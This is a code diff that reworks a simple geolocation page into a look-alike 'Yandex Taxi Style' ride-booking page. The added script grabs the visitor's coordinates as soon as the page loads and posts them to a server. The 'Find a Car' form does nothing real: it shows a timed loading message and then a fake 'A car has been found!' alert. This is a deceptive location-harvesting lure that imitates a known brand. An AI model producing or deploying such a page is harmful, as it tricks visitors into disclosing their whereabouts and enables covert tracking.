@@ -3,22 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation App</title>
+    <title>Yandex Taxi Style Geolocation</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            position: relative;
+        }
+        h1 {
+            color: #FFCC00;
+            font-size: 2em;
+            margin: 0;
+        }
+        input, button {
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            padding: 10px;
+            margin: 10px 0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #FFCC00;
+            border: none;
+            color: #fff;
+            font-size: 1.2em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #e6b800;
+        }
+        .loading {
+            display: none;
+            font-size: 1.2em;
+            color: #333;
+            margin-top: 20px;
+        }
+        .loading.active {
+            display: block;
+        }
+    </style>
 </head>
 <body>
-<h1>Geolocation App</h1>
-<button onclick="getLocation()">Send Location</button>
+<div class="container">
+    <h1>Yandex Taxi Style Geolocation</h1>
+    <form id="locationForm">
+        <input type="text" id="destination" placeholder="Enter your destination" required>
+        <input type="text" id="phoneNumber" placeholder="Enter your phone number (not sent)" required>
+        <button type="submit">Find a Car</button>
+    </form>
+    <div class="loading" id="loading">Searching for a car...</div>
+</div>
 
 <script>
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(savePosition);
-        } else {
-            alert("Geolocation is not supported by this browser.");
-        }
-    }
-
-    function savePosition(position) {
+    function sendLocation(position) {
         const data = {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude
@@ -32,9 +82,38 @@
             body: JSON.stringify(data)
         })
             .then(response => response.text())
-            .then(data => alert(data))
+            .then(data => {
+                console.log('Location sent successfully!');
+                document.getElementById('loading').classList.add('active');
+                setTimeout(() => {
+                    document.getElementById('loading').classList.remove('active');
+                    alert('A car has been found!');
+                }, 3000); // Simulate car search delay
+            })
             .catch(error => console.error('Error:', error));
     }
+
+    function handleError(error) {
+        console.error('Error getting location:', error);
+        alert('Error getting location: ' + error.message);
+    }
+
+    window.onload = () => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    };
+
+    document.getElementById('locationForm').addEventListener('submit', (event) => {
+        event.preventDefault();
+        document.getElementById('loading').classList.add('active');
+        setTimeout(() => {
+            document.getElementById('loading').classList.remove('active');
+            alert('A car has been found!');
+        }, 3000); // Simulate car search delay
+    });
 </script>
 </body>
 </html>
